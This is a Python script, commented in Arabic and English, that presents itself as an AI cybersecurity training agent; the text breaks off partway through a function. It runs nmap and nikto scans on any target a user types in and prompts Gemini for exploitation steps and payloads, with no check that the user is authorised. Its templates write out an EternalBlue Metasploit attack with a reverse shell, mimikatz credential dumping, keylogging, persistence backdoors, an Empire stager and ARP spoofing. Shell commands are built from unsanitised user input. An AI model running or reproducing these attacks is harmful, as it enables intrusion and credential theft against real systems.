#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
═══════════════════════════════════════════════════════════════════════════════
    AI Cybersecurity Training Agent v2.0 - Professional Edition
    وكيل تدريب الأمن السيبراني المتقدم
═══════════════════════════════════════════════════════════════════════════════

وصف:
    منصة تدريب احترافية متكاملة للأمن السيبراني باستخدام الذكاء الاصطناعي.
    تدعم 10 مجالات تدريبية رئيسية مع دمج أدوات Kali Linux.

المطور: خبير أمن سيبراني متقدم
الإصدار: 2.0 Professional
"""

import os
import sys
import subprocess
import json
import time
import requests
import google.generativeai as genai
from datetime import datetime
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════════
# 1. الإعدادات والتهيئة / CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "YOUR_GEMINI_API_KEY_HERE")
MODEL_NAME = "gemini-1.5-flash"

# تعريف المسارات
BASE_DIR = Path(__file__).parent.resolve()
TRAINING_DIR = BASE_DIR / "training_data"
REPORTS_DIR = BASE_DIR / "reports"
PAYLOADS_DIR = BASE_DIR / "payloads"
LOGS_DIR = BASE_DIR / "logs"

# إنشاء المجلدات اللازمة
for directory in [TRAINING_DIR, REPORTS_DIR, PAYLOADS_DIR, LOGS_DIR]:
    directory.mkdir(exist_ok=True)

# تعريف مجالات التدريب العشرة
TRAINING_DOMAINS = {
    "1": {
        "name_ar": "فحص انظمة التشغيل وكشف الثغرات",
        "name_en": "Operating System Scanning & Vulnerability Detection",
        "file": "os_vuln_scanning",
        "tools": ["nmap", "openvas", "nessus", "nikto", "vulners"],
        "icon": "🖥️"
    },
    "2": {
        "name_ar": "اختبار اختراق الشبكات",
        "name_en": "Network Penetration Testing",
        "file": "network_pentest",
        "tools": ["metasploit", "wireshark", "aircrack-ng", "ettercap", "bettercap"],
        "icon": "🌐"
    },
    "3": {
        "name_ar": "حماية الشبكات وطرد المخترقين",
        "name_en": "Network Protection & Hacker Expulsion",
        "file": "network_protection",
        "tools": ["snort", "suricata", "iptables", "tcpdump", "fail2ban"],
        "icon": "🛡️"
    },
    "4": {
        "name_ar": "استغلال ثغرات ويندوز",
        "name_en": "Exploiting Windows Vulnerabilities",
        "file": "windows_exploitation",
        "tools": ["empire", "mimikatz", "powersploit", "crackmapexec", "bloodhound"],
        "icon": "🪟"
    },
    "5": {
        "name_ar": "حماية الانظمة من الهجمات المشهورة",
        "name_en": "Protecting Systems from Popular Attacks",
        "file": "attack_protection",
        "tools": ["modsecurity", "ossec", "tripwire", "clamav", "rkhunter"],
        "icon": "🔒"
    },
    "6": {
        "name_ar": "انشاء حمولة للاندرويد",
        "name_en": "Create Android Payload",
        "file": "android_payload",
        "tools": ["msfvenom", "apktool", "jadx", "drozer", "frida"],
        "icon": "📱"
    },
    "7": {
        "name_ar": "الهندسة العكسية لتطبيقات الهواتف",
        "name_en": "Reverse Engineering of Mobile Applications",
        "file": "mobile_reversing",
        "tools": ["ghidra", "jadx", "apktool", "frida", "objection"],
        "icon": "🔧"
    },
    "8": {
        "name_ar": "تخطي الجدران النارية",
        "name_en": "Bypass Firewalls",
        "file": "firewall_bypass",
        "tools": ["proxychains", "nmap-scripts", "hping3", "ncat", "iodine"],
        "icon": "🔥"
    },
    "9": {
        "name_ar": "البحث والمسح وجمع المعلومات",
        "name_en": "Research, Survey & Information Gathering",
        "file": "reconnaissance",
        "tools": ["theharvester", "maltego", "shodan", "recon-ng", "spiderfoot"],
        "icon": "🔍"
    },
    "10": {
        "name_ar": "زرع برمجية باكدور في الانظمة",
        "name_en": "Planting Backdoor Software",
        "file": "backdoor_implant",
        "tools": ["metasploit-listener", "netcat", "weevely", "php-backdoor", "persistence"],
        "icon": "🚪"
    }
}

# ═══════════════════════════════════════════════════════════════════════════════
# 2. تهيئة الذكاء الاصطناعي
# ═══════════════════════════════════════════════════════════════════════════════

def initialize_gemini():
    """تهيئة اتصال Google Generative AI"""
    if not GEMINI_API_KEY or GEMINI_API_KEY == "YOUR_GEMINI_API_KEY_HERE":
        print("\n\033[91m[!] خطأ: الرجاء تعيين مفتاح API في متغير البيئة GEMINI_API_KEY\033[0m")
        print("\033[94m[*] يمكنك الحصول عليه من: https://aistudio.google.com/\033[0m")
        print("\033[93m[*] مثال: export GEMINI_API_KEY='your_key_here'\033[0m\n")
        return False
    try:
        genai.configure(api_key=GEMINI_API_KEY)
        return True
    except Exception as e:
        print(f"\n\033[91m[!] خطأ في تهيئة Gemini: {e}\033[0m\n")
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# 3. الواجهة الرسومية / BANNER
# ═══════════════════════════════════════════════════════════════════════════════

def print_banner():
    banner = """
\033[95m╔═══════════════════════════════════════════════════════════════════════════════╗
║  \033[96m██████╗  ██████╗ ████████╗    ██████╗ ██╗   ██╗ ██████╗                      \033[95m║
║  \033[96m██╔══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗██║   ██║██╔════╝                      \033[95m║
║  \033[96m██████╔╝██║   ██║   ██║       ██████╔╝██║   ██║██║  ███╗                     \033[95m║
║  \033[96m██╔═══╝ ██║   ██║   ██║       ██╔══██╗██║   ██║██║   ██║                     \033[95m║
║  \033[96m██║     ╚██████╔╝   ██║       ██████╔╝╚██████╔╝╚██████╔╝                     \033[95m║
║  \033[96m╚═╝      ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝  ╚═════╝                      \033[95m║
║                                                                               ║
║  \033[93m        AI Cybersecurity Training Agent v2.0 - Professional Edition         \033[95m║
║  \033[92m        وكيل تدريب الامن السيبراني المتقدم - الاصدار الاحترافي 2.0          \033[95m║
╚═══════════════════════════════════════════════════════════════════════════════╝\033[0m
"""
    print(banner)

def print_menu():
    """طباعة القائمة الرئيسية"""
    print("\n\033[94m╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║                      \033[97mالقائمة الرئيسية - Main Menu                           \033[94m║")
    print("╠═══════════════════════════════════════════════════════════════════════════════╣\033[0m")

    for key, domain in TRAINING_DOMAINS.items():
        print(f"\033[97m  [{key}] {domain['icon']} {domain['name_ar']}")
        print(f"      \033[90m└─ {domain['name_en']}\033[0m")

    print("\033[94m╠═══════════════════════════════════════════════════════════════════════════════╣")
    print("║  \033[97m[11] 📚 ادارة قاعدة بيانات التدريب (Training Database Manager)             \033[94m║")
    print("║  \033[97m[12] 🤖 تشغيل الوكيل الذكي على هدف محدد (Run AI Agent on Target)           \033[94m║")
    print("║  \033[97m[13] 📊 انشاء تقرير تدريبي شامل (Generate Training Report)                 \033[94m║")
    print("║  \033[97m[14] ⚙️  فحص متطلبات النظام (System Requirements Check)                    \033[94m║")
    print("║  \033[91m[99] 🚪 خروج (Exit)                                                        \033[94m║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝\033[0m\n")

# ═══════════════════════════════════════════════════════════════════════════════
# 4. ادارة التدريب - Training Management
# ═══════════════════════════════════════════════════════════════════════════════

def get_training_file(domain_key):
    """الحصول على مسار ملف التدريب"""
    domain = TRAINING_DOMAINS[domain_key]
    return TRAINING_DIR / f"{domain['file']}.json"

def load_training_data(domain_key):
    """تحميل بيانات التدريب لمجال معين"""
    file_path = get_training_file(domain_key)
    if file_path.exists():
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"\033[91m[!] خطأ في قراءة ملف التدريب: {e}\033[0m")
    return {"reports": [], "payloads": [], "scenarios": []}

def save_training_data(domain_key, data):
    """حفظ بيانات التدريب"""
    file_path = get_training_file(domain_key)
    try:
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"\033[91m[!] خطأ في حفظ ملف التدريب: {e}\033[0m")
        return False

def add_training_report(domain_key):
    """اضافة تقرير تدريبي جديد"""
    domain = TRAINING_DOMAINS[domain_key]
    print(f"\n\033[94m{'='*70}")
    print(f"\033[96m  اضافة تقرير تدريبي جديد: {domain['name_ar']}")
    print(f"\033[90m  {domain['name_en']}")
    print(f"\033[94m{'='*70}\033[0m\n")

    report_type = input("\033[93m[*] نوع التقرير (report/writeup/payload/scenario): \033[0m").strip().lower()

    if report_type not in ["report", "writeup", "payload", "scenario"]:
        print("\033[91m[-] نوع غير صحيح! استخدم: report, writeup, payload, or scenario\033[0m")
        return

    title = input("\033[93m[*] عنوان التقرير: \033[0m").strip()
    if not title:
        print("\033[91m[-] العنوان لا يمكن ان يكون فارغاً!\033[0m")
        return

    print("\033[92m[*] ادخل محتوى التقرير (اكتب 'END' في سطر منفصل للانهاء):\033[0m")
    print("-" * 50)

    lines = []
    while True:
        try:
            line = input()
            if line.strip() == "END":
                break
            lines.append(line)
        except KeyboardInterrupt:
            print("\n\033[91m[-] تم الالغاء.\033[0m")
            return

    content = "\n".join(lines)
    if not content.strip():
        print("\033[91m[-] المحتوى فارغ!\033[0m")
        return

    # تحميل البيانات الحالية
    data = load_training_data(domain_key)

    report_entry = {
        "title": title,
        "type": report_type,
        "content": content,
        "date": datetime.now().isoformat(),
        "tools_used": domain["tools"]
    }

    if report_type == "payload":
        data["payloads"].append(report_entry)
    elif report_type == "scenario":
        data["scenarios"].append(report_entry)
    else:
        data["reports"].append(report_entry)

    if save_training_data(domain_key, data):
        print(f"\n\033[92m[+] تم حفظ التقرير بنجاح في: {domain['file']}.json\033[0m")
        total = len(data['reports']) + len(data['payloads']) + len(data['scenarios'])
        print(f"\033[92m[+] اجمالي التقارير في هذا المجال: {total}\033[0m")

# ═══════════════════════════════════════════════════════════════════════════════
# 5. تشغيل ادوات Kali Linux - Tool Integration
# ═══════════════════════════════════════════════════════════════════════════════

def run_system_command(command, timeout=60):
    """تشغيل امر نظامي بأمان"""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "[!] انتهت مهلة التنفيذ"
    except Exception as e:
        return -1, "", str(e)

def check_tool_availability(tool_name):
    """التحقق من توفر اداة في النظام"""
    return_code, _, _ = run_system_command(f"which {tool_name}")
    return return_code == 0

def system_requirements_check():
    """فحص متطلبات النظام"""
    print("\n\033[94m╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║                    \033[97mفحص متطلبات النظام - System Check                         \033[94m║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝\033[0m\n")

    required_tools = {
        "nmap": "فحص المنافذ والشبكات",
        "msfconsole": "اطار عمل Metasploit",
        "msfvenom": "انشاء الحمولات",
        "wireshark": "تحليل حركة الشبكة",
        "python3": "محرك Python",
        "pip3": "مدير حزم Python",
        "nikto": "فحص ثغرات الويب",
        "gobuster": "كشف المسارات",
        "hydra": "هجوم القوة العمياء",
        "sqlmap": "اختبار SQL Injection",
        "aircrack-ng": "اختبار اختراق WiFi",
        "ettercap": "هجوم الرجل في المنتصف",
        "apktool": "فك تجميع APK",
        "jadx": "الهندسة العكسية لـ APK",
        "proxychains": "توجيه عبر بروكسي",
        "netcat": "اداة الشبكة المتعددة",
        "tcpdump": "التقاط حزم الشبكة",
        "snort": "نظام كشف التسلل",
        "theharvester": "جمع المعلومات OSINT"
    }

    available = 0
    missing = []

    for tool, description in required_tools.items():
        status = "\033[92m✓ متاح" if check_tool_availability(tool) else "\033[91m✗ غير متاح"
        if check_tool_availability(tool):
            available += 1
        else:
            missing.append(tool)
        print(f"  {status}\033[0m  \033[97m{tool:<15}\033[0m - {description}")

    print(f"\n\033[94m{'='*70}\033[0m")
    print(f"\033[92m[+] الادوات المتاحة: {available}/{len(required_tools)}\033[0m")

    if missing:
        print(f"\033[91m[-] الادوات المفقودة: {', '.join(missing)}\033[0m")
        print("\033[93m[*] لتثبيت الادوات المفقودة في Kali Linux:\033[0m")
        print(f"\033[93m    sudo apt update && sudo apt install -y {' '.join(missing)}\033[0m")
    else:
        print("\033[92m[+] جميع الادوات متاحة! النظام جاهز للتدريب.\033[0m")

# ═══════════════════════════════════════════════════════════════════════════════
# 6. قوالب التقارير التدريبية الجاهزة - Ready-Made Templates
# ═══════════════════════════════════════════════════════════════════════════════

def generate_training_templates():
    """انشاء قوالب تقارير تدريبية جاهزة لجميع المجالات"""

    templates = {
        "os_vuln_scanning": {
            "reports": [
                {
                    "title": "فحص شامل لنظام Linux باستخدام Nmap وNessus",
                    "type": "report",
                    "content": "=== تقرير فحص نظام التشغيل ===\nالهدف: 192.168.1.100 (Ubuntu Server 22.04)\nالادوات: Nmap, OpenVAS, Nessus\n\n[مرحلة 1: فحص المنافذ]\n├─ nmap -sS -sV -O -p- 192.168.1.100\n├─ النتائج: المنافذ المفتوحة 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL)\n└─ نظام التشغيل المكتشف: Linux 5.15\n\n[مرحلة 2: فحص الثغرات]\n├─ nmap --script vuln 192.168.1.100\n├─ OpenVAS Full Scan\n└─ النتائج:\n   • CVE-2023-XXXX: ثغرة في OpenSSH 8.9 (تصعيد صلاحيات)\n   • CVE-2023-YYYY: ثغرة في Apache 2.4.41 (تنفيذ كود عن بعد)\n   • Misconfiguration: MySQL بدون كلمة مرور\n\n[مرحلة 3: التوصيات]\n├─ تحديث OpenSSH الى الاصدار 9.0+\n├─ تحديث Apache وتمكين WAF\n└─ تأمين MySQL بكلمة مرور قوية وتقييد الوصول\n\nمستوى الخطورة: عالي (CVSS: 8.5)",
                    "date": datetime.now().isoformat(),
                    "tools_used": ["nmap", "openvas", "nessus"]
                }
            ],
            "payloads": [],
            "scenarios": [
                {
                    "title": "سيناريو: اكتشاف خادم ويب غير محدث",
                    "type": "scenario",
                    "content": "=== السيناريو التدريبي ===\nالوضع: انت تختبر اختراق شبكة داخلية\nالمهمة: اكتشاف الثغرات في الخوادم\n\nالخطوات:\n1. مسح الشبكة: nmap -sn 192.168.1.0/24\n2. اكتشاف الاجهزة النشطة\n3. فحص المنافذ التفصيلي على كل جهاز\n4. تحديد اصدارات الخدمات\n5. مطابقة الاصدارات مع قاعدة بيانات CVE\n6. اعداد تقرير شامل بالثغرات\n\nالنقاط التعليمية:\n• فهم بروتوكولات الشبكة\n• قراءة نتائج Nmap\n• تحليل CVEs\n• كتابة تقارير احترافية",
                    "date": datetime.now().isoformat(),
                    "tools_used": ["nmap", "openvas"]
                }
            ]
        },
        "network_pentest": {
            "reports": [
                {
                    "title": "اختبار اختراق شبكة LAN داخلية",
                    "type": "report",
                    "content": "=== تقرير اختبار اختراق الشبكة ===\nنطاق الاختبار: 192.168.1.0/24\nالادوات: Metasploit, Wireshark, Bettercap\n\n[المرحلة 1: جمع المعلومات]\n├─ netdiscover -r 192.168.1.0/24\n├─ الاجهزة المكتشفة: 15 جهاز\n└─ الاجهزة المهمة: Router (192.168.1.1), Server (192.168.1.10)\n\n[المرحلة 2: هجوم الرجل في المنتصف]\n├─ bettercap -iface eth0 -eval 'net.probe on; arp.spoof on'\n├─ التقاط حركة المرور\n└─ النتائج: كشف كلمات مرور HTTP غير مشفرة\n\n[المرحلة 3: استغلال Metasploit]\n├─ استخدام ms17_010_eternalblue على Windows 7\n├─ فتح Meterpreter session\n└─ استخراج كلمات المرور بـ hashdump\n\n[المرحلة 4: ما بعد الاختراق]\n├─ Pivoting عبر الشبكة\n├─ الوصول الى قاعدة البيانات\n└─ استخراج الملفات الحساسة\n\nالتوصيات:\n• تفعيل HTTPS على جميع الخدمات\n• تقسيم الشبكة (VLANs)\n• تفعيل Dynamic ARP Inspection\n• تحديث جميع انظمة Windows",
                    "date": datetime.now().isoformat(),
                    "tools_used": ["metasploit", "wireshark", "bettercap"]
                }
            ],
            "payloads": [],
            "scenarios": []
        },
        "network_protection": {
            "reports": [
                {
                    "title": "اعداد Snort لكشف هجمات SQL Injection",
                    "type": "report",
                    "content": "=== تقرير حماية الشبكة ===\nالهدف: حماية خادم الويب من هجمات SQLi\nالاداة: Snort IDS/IPS\n\n[الاعداد 1: تثبيت Snort]\n├─ sudo apt install snort\n├─ تكوين الواجهة: eth0\n└─ تحديث قواعد القواعد (Rules)\n\n[الاعداد 2: قواعد كشف SQLi]\n├─ انشاء قاعدة مخصصة:\n   alert tcp any any -> $HOME_NET 80 (msg:'SQL Injection Detected'; content:'union'; nocase; sid:1000001; rev:1;)\n├─ اضافة قواعد لكلمات مفتاحية: SELECT, INSERT, DROP, --\n└─ تفعيل Blocking Mode\n\n[الاعداد 3: كشف الماسحات]\n├─ كشف Nmap: alert tcp any any -> $HOME_NET any (msg:'Nmap Scan'; content:'Nmap'; sid:1000002;)\n├─ كشف Nikto: alert tcp any any -> $HOME_NET 80 (msg:'Nikto Scan'; content:'Nikto'; sid:1000003;)\n└─ حظر تلقائي عبر iptables\n\n[الاختبار]\n├─ تشغيل sqlmap ضد الموقع\n├─ Snort يكتشف الهجوم ويحظر IP\n└─ ارسال تنبيه الى المسؤول\n\nالنتائج:\n• معدل الكشف: 95%\n• False Positives: <2%\n• زمن الاستجابة: <100ms",
                    "date": datetime.now().isoformat(),
                    "tools_used": ["snort", "iptables", "tcpdump"]
                }
            ],
            "payloads": [],
            "scenarios": []
        },
        "windows_exploitation": {
            "reports": [
                {
                    "title": "استغلال ثغرة EternalBlue على Windows 7",
                    "type": "report",
                    "content": "=== تقرير استغلال Windows ===\nالهدف: Windows 7 SP1 (192.168.1.50)\nالثغرة: MS17-010 (EternalBlue)\nالادوات: Metasploit, Mimikatz\n\n[المرحلة 1: التحقق من الثغرة]\n├─ nmap --script smb-vuln-ms17-010 192.168.1.50\n├─ النتيجة: VULNERABLE\n└─ SMBv1 مفعل بدون تحديثات\n\n[المرحلة 2: الاستغلال]\n├─ use exploit/windows/smb/ms17_010_eternalblue\n├─ set RHOSTS 192.168.1.50\n├─ set PAYLOAD windows/x64/meterpreter/reverse_tcp\n├─ set LHOST 192.168.1.100\n├─ exploit\n└─ فتح Meterpreter Session\n\n[المرحلة 3: ما بعد الاختراق]\n├─ getuid → NT AUTHORITY\\SYSTEM\n├─ migrate الى explorer.exe\n├─ load kiwi (Mimikatz)\n├─ creds_all → استخراج كلمات المرور\n├─ screenshot → التقاط الشاشة\n└─ keyscan_start → تسجيل ضربات المفاتيح\n\n[المرحلة 4: الاستمرارية]\n├─ run persistence -U -i 5 -p 4444 -r 192.168.1.100\n├─ انشاء Backdoor في Registry\n└─ انشاء Scheduled Task\n\nالتوصيات:\n• تثبيت KB4013389 فوراً\n• تعطيل SMBv1\n• تفعيل Windows Defender\n• تحديث كلمات المرور",
                    "date": datetime.now().isoformat(),
                    "tools_used": ["metasploit", "mimikatz", "empire"]
                }
            ],
            "payloads": [
                {
                    "title": "PowerShell Empire Stager",
                    "type": "payload",
                    "content": "=== بايلود Empire ===\n# انشاء Listener\nlisteners\nuselistener http\nset Host 192.168.1.100\nset Port 8080\nexecute\n\n# انشاء Stager\nusestager windows/launcher_bat\nset Listener http\nexecute\n\n# الناتج: launcher.bat - يفتح session عند التشغيل\n\n# الاوامر بعد الاتصال:\nagents\ninteract <agent_name>\nshell whoami\nshell net user\nmimikatz\n    creds_all\n    sekurlsa::logonpasswords\n\n# Pivoting\nusemodule management/spawn*\nusemodule situational_awareness/network/powerview/*",
                    "date": datetime.now().isoformat(),
                    "tools_used": ["empire", "mimikatz"]
                }
            ],
            "scenarios": []
        },
        "attack_protection": {
            "reports": [
                {
                    "title": "حماية من هجوم DDoS باستخدام iptables وFail2ban",
                    "type": "report",
                    "content": "=== تقرير حماية من هجمات DDoS ===\nالهدف: حماية خادم الويب من هجمات الحرمان من الخدمة\nالادوات: iptables, Fail2ban, ModSecurity\n\n[الحماية 1: iptables Rate Limiting]\n├─ iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT\n├─ iptables -A INPUT -p tcp --dport 80 -j DROP\n├─ iptables -A INPUT -p tcp --dport 443 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT\n└─ iptables -A INPUT -p tcp --dport 443 -j DROP\n\n[الحماية 2: Fail2ban]\n├─ تثبيت: sudo apt install fail2ban\n├─ تكوين /etc/fail2ban/jail.local:\n   [sshd]\n   enabled = true\n   port = ssh\n   filter = sshd\n   logpath = /var/log/auth.log\n   maxretry = 3\n   bantime = 3600\n├─ تفعيل: sudo systemctl enable fail2ban\n└─ المراقبة: sudo fail2ban-client status sshd\n\n[الحماية 3: ModSecurity WAF]\n├─ تثبيت: sudo apt install libapache2-mod-security2\n├─ تفعيل: sudo a2enmod security2\n├─ تكوين القواعد (OWASP CRS)\n└─ كشف ومنع: SQLi, XSS, LFI, RCE\n\n[الحماية 4: SYN Flood Protection]\n├─ sysctl -w net.ipv4.tcp_syncookies=1\n├─ sysctl -w net.ipv4.tcp_max_syn_backlog=2048\n├─ iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\n└─ iptables -A INPUT -p tcp --syn -j DROP\n\n[الاختبار]\n├─ hping3 -S -p 80 --flood 192.168.1.10\n├─ النتيجة: الحماية تعمل، الاتصالات المشروعة تمر\n└─ Fail2ban يحظر IP المهاجم تلقائياً",
                    "date": datetime.now().isoformat(),
                    "tools_used": ["iptables", "fail2ban", "modsecurity"]
                }
            ],
            "payloads": [],
            "scenarios": []
        }
    }

    # حفظ القوالب
    created_count = 0
    for domain_key, template_data in templates.items():
        file_path = TRAINING_DIR / f"{TRAINING_DOMAINS[domain_key]['file']}.json"
        if not file_path.exists():
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(template_data, f, ensure_ascii=False, indent=2)
            created_count += 1

    return created_count

# ═══════════════════════════════════════════════════════════════════════════════
# 7. الوكيل الذكي - AI Agent Core
# ═══════════════════════════════════════════════════════════════════════════════

def run_ai_agent():
    """تشغيل الوكيل الذكي على هدف محدد"""
    print("\n\033[94m╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║                    \033[97mتشغيل الوكيل الذكي - AI Agent Mode                       \033[94m║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝\033[0m\n")

    print("\033[93m[*] اختر نوع الهدف:\033[0m")
    print("  [1] 🌐 موقع ويب (Web Application)")
    print("  [2] 🖥️  نظام تشغيل / خادم (OS/Server)")
    print("  [3] 🌐 شبكة / نطاق IP (Network/Subnet)")
    print("  [4] 📱 تطبيق موبايل (Mobile Application)")
    print("  [5] 🪟  نظام ويندوز (Windows System)")
    print("  [6] 🤖 تحليل تقرير يدوي (Analyze Manual Report)")

    target_type = input("\n\033[93m[*] اختر نوع الهدف (1-6): \033[0m").strip()

    if target_type == "1":
        target_url = input("\033[93m[*] ادخل رابط الموقع: \033[0m").strip()
        scan_web_target(target_url)
    elif target_type == "2":
        target_ip = input("\033[93m[*] ادخل عنوان IP: \033[0m").strip()
        scan_os_target(target_ip)
    elif target_type == "3":
        target_subnet = input("\033[93m[*] ادخل النطاق (مثال: 192.168.1.0/24): \033[0m").strip()
        scan_network_target(target_subnet)
    elif target_type == "4":
        apk_path = input("\033[93m[*] ادخل مسار ملف APK: \033[0m").strip()
        scan_mobile_target(apk_path)
    elif target_type == "5":
        target_ip = input("\033[93m[*] ادخل عنوان IP لنظام Windows: \033[0m").strip()
        scan_windows_target(target_ip)
    elif target_type == "6":
        analyze_manual_report()
    else:
        print("\033[91m[-] اختيار غير صحيح!\033[0m")

def scan_web_target(target_url):
    """فحص موقع ويب"""
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    print(f"\n\033[94m[*] جاري فحص الموقع: {target_url}...\033[0m")

    # تشغيل Nmap على الموقع
    print("\033[93m[*] تشغيل Nmap...\033[0m")
    host = target_url.replace('http://','').replace('https://','').split('/')[0]
    _, nmap_out, _ = run_system_command(f"nmap -sV --script vuln {host}", timeout=120)

    # تشغيل Nikto
    print("\033[93m[*] تشغيل Nikto...\033[0m")
    _, nikto_out, _ = run_system_command(f"nikto -h {target_url}", timeout=120)

    # جلب كود HTML
    try:
        resp = requests.get(target_url, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
        html_content = resp.text[:15000]
    except:
        html_content = "[تعذر جلب المحتوى]"

    # تحميل بيانات التدريب
    training_context = build_training_context()

    # ارسال للذكاء الاصطناعي
    prompt = f"""
=== معلومات الهدف ===
النوع: موقع ويب
الرابط: {target_url}

=== نتائج Nmap ===
{nmap_out[:5000]}

=== نتائج Nikto ===
{nikto_out[:5000]}

=== كود HTML ===
```html
{html_content[:8000]}
```

=== بيانات التدريب ===
{training_context[:8000]}

=== التعليمات ===
انت وكيل امن سيبراني متقدم. حلل البيانات اعلاه وقدم:
1. ملخص للثغرات المكتشفة
2. تقييم الخطورة (CVSS)
3. خطوات الاستغلال
4. التوصيات الامنية
5. بايلودات مقترحة
الرد باللغة العربية مع المصطلحات الانجليزية بين قوسين.
"""

    generate_ai_response(prompt, "تقرير فحص موقع ويب")

def scan_os_target(target_ip):
    """فحص نظام تشغيل"""
    print(f"\n\033[94m[*] جاري فحص النظام: {target_ip}...\033[0m")

    _, nmap_out, _ = run_system_command(f"nmap -sS -sV -O -A {target_ip}", timeout=120)
    _, vuln_out, _ = run_system_command(f"nmap --script vuln {target_ip}", timeout=120)

    training_context = build_training_context()

    prompt = f"""
=== معلومات الهدف ===
النوع: نظام تشغيل
العنوان: {target_ip}

=== نتائج Nmap Comprehensive ===
{nmap_out[:8000]}

=== نتائج فحص الثغرات ===
{vuln_out[:5000]}

=== بيانات التدريب ===
{training_context[:5000]}

=== التعليمات ===
حلل نتائج الفحص وقدم:
1. نوع نظام التشغيل والخدمات
2. الثغرات المكتشفة مع CVEs
3. استراتيجية الاستغلال
4. خطوات Post-Exploitation
5. التوصيات الامنية
الرد باللغة العربية.
"""

    generate_ai_response(prompt, "تقرير فحص نظام التشغيل")

def scan_network_target(subnet):
    """فحص شبكة"""
    print(f"\n\033[94m[*] جاري فحص الشبكة: {subnet}...\033[0m")

    _, nmap_out, _ = run_system_command(f"nmap -sP {subnet}", timeout=60)
    _, detailed_out, _ = run_system_command(f"nmap -sS -sV {subnet}", timeout=180)

    training_context = build_training_context()

    prompt = f"""
=== معلومات الهدف ===
النوع: شبكة
النطاق: {subnet}

=== الاجهزة النشطة ===
{nmap_out[:3000]}

=== الفحص التفصيلي ===
{detailed_out[:8000]}

=== بيانات التدريب ===
{training_context[:5000]}

=== التعليمات ===
حلل خريطة الشبكة وقدم:
1. قائمة الاجهزة والخدمات
2. نقاط الضعف الرئيسية
3. استراتيجية اختبار الاختراق
4. مسارات الهجوم المحتملة
5. توصيات تقسيم الشبكة
الرد باللغة العربية.
"""

    generate_ai_response(prompt, "تقرير فحص الشبكة")

def scan_mobile_target(apk_path):
    """فحص تطبيق موبايل"""
    print(f"\n\033[94m[*] جاري تحليل APK: {apk_path}...\033[0m")

    _, apktool_out, _ = run_system_command(f"apktool d '{apk_path}' -o /tmp/mobile_analysis", timeout=60)

    manifest_content = ""
    manifest_path = "/tmp/mobile_analysis/AndroidManifest.xml"
    if os.path.exists(manifest_path):
        with open(manifest_path, "r", encoding="utf-8", errors="ignore") as f:
            manifest_content = f.read()[:5000]

    training_context = build_training_context()

    prompt = f"""
=== معلومات الهدف ===
النوع: تطبيق Android
المسار: {apk_path}

=== AndroidManifest.xml ===
```xml
{manifest_content}
```

=== بيانات التدريب ===
{training_context[:5000]}

=== التعليمات ===
حلل ملف AndroidManifest وقدم:
1. الصلاحيات المطلوبة (Permissions) ومدى خطورتها
2. المكونات المصدرة (Exported Components)
3. نقاط الضعف المحتملة
4. توصيات الامان
5. خطوات الهندسة العكسية
الرد باللغة العربية.
"""

    generate_ai_response(prompt, "تقرير تحليل تطبيق موبايل")

def scan_windows_target(target_ip):
    """فحص نظام Windows"""
    print(f"\n\033[94m[*] جاري فحص نظام Windows: {target_ip}...\033[0m")

    _, nmap_out, _ = run_system_command(f"nmap -sS -sV -O --script smb-vuln* {target_ip}", timeout=120)

    training_context = build_training_context()

    prompt = f"""
=== معلومات الهدف ===
النوع: Windows System
العنوان: {target_ip}

=== نتائج فحص SMB Vulnerabilities ===
{nmap_out[:8000]}

=== بيانات التدريب ===
{training_context[:5000]}

=== التعليمات ===
حلل النظام Windows وقدم:
1. الاصدار والثغرات المعروفة
2. استراتيجية الاستغلال (EternalBlue, etc.)
3. خطوات Post-Exploitation
4. استخراج الـ Hashes
5. التوصيات الامنية
الرد باللغة العربية.
"""

    generate_ai_response(prompt, "تقرير فحص Windows")

def analyze_manual_report():
    """تحليل تقرير يدوي"""
    print("\n\033[94m[*] الصق التقرير الذي تريد تحليله (اكتب 'END' للانهاء):\033[0m")
    lines = []
    while True:
        line = input()
        if line.strip() == "END":
            break
        lines.append(line)

    report = "\n".join(lines)

    prompt = f"""
=== تقرير للتحليل ===
{report[:15000]}

=== التعليمات ===
انت خبير امن سيبراني. حلل هذا التقرير وقدم:
1. ملخص تنفيذي
2. الثغرات المكتشفة مع تصنيفها
3. مستوى الخطورة
4. خطوات الاصلاح
5. بايلودات او ادوات مقترحة
6. مراجع CVE ان وجدت
الرد باللغة العربية.
"""

    generate_ai_response(prompt, "تحليل تقرير يدوي")

def build_training_context():
    """بناء سياق التدريب من جميع المجالات"""
    context = ""
    for key in TRAINING_DOMAINS:
        data = load_training_data(key)
        if data.get("reports") or data.get("payloads"):
            context += f"\n=== {TRAINING_DOMAINS[key]['name_ar']} ===\n"
            for report in data.get("reports", [])[:3]:
                context += f"\n[{report['title']}]\n{report['content'][:1000]}\n"
            for payload in data.get("payloads", [])[:2]:
                context += f"\n[PAYLOAD: {payload['title']}]\n{payload['content'][:800]}\n"
    return context

def generate_ai_response(prompt, title):
    """ارسال Prompt للذكاء الاصطناعي وعرض النتيجة"""
    print("\n\033[95m[*] جاري تحليل البيانات بواسطة الذكاء الاصطناعي...\033[0m")

    system_instruction = (
